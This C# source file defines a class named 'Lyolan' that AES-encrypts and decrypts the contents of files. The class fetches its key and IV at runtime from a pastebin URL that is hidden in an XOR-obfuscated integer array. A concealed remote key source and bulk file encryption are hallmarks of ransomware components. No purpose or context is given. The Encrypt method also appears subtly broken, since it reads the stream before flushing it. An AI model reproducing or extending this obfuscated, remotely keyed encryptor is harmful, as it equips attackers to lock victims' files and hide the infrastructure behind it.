namespace Project
{
    using System;
    using System.IO;
    using System.Net.Http;
    using System.Security.Cryptography;
    using System.Text;

    public class Lyolan
    {
        int[] EP = {11,1,3,24,22,86,78,64,25,2,6,3,13,7,5,15,65,10,12,24,88,26,4,27,78,92,14,90,5,21,45,54,15};
        const string Xy = "cuwhelaoi";

        private readonly byte[] key;
        private readonly byte[] iv;

        public Lyolan()
        {
            var parts = GetKeyAndIV();
            key = Encoding.UTF8.GetBytes(parts[0]);
            iv  = Encoding.UTF8.GetBytes(parts[1]);
        }

        public string[] GetKeyAndIV()
        {
            int i = 0;
            int k = 0;
            int S = EP.Length;
            string url = "";

            while (i < S)
            {
                int l = k++ % Xy.Length;
                int j = EP[i++] ^ Xy[l];
                url += (char)j;
            }

            using var client = new HttpClient();
            string c = client.GetStringAsync(url).GetAwaiter().GetResult();

            return new string[] {
                c.Substring(0, 16),
                c.Substring(16, 16)
            };
        }

        public string Encrypt(string fp)
        {
            if (!File.Exists(fp))
            {
                Console.WriteLine("File not found.");
                return "";
            }

            string fc = File.ReadAllText(fp);

            using Aes aes = Aes.Create();
            aes.Key = key;
            aes.IV = iv;

            using MemoryStream ms = new();
            using CryptoStream cs = new(ms, aes.CreateEncryptor(), CryptoStreamMode.Write);
            using StreamWriter sw = new(cs);

            sw.Write(fc);

            return Convert.ToBase64String(ms.ToArray());
        }

        public string Decrypt(string fp)
        {
            if (!File.Exists(fp))
            {
                Console.WriteLine("File not found.");
                return "";
            }

            string cipherText = File.ReadAllText(fp);
            byte[] buffer = Convert.FromBase64String(cipherText);

            using Aes aes = Aes.Create();
            aes.Key = key;
            aes.IV = iv;

            using MemoryStream ms = new(buffer);
            using CryptoStream cs = new(ms, aes.CreateDecryptor(), CryptoStreamMode.Read);
            using StreamReader sr = new(cs);

            return sr.ReadToEnd();
        }
    }
}
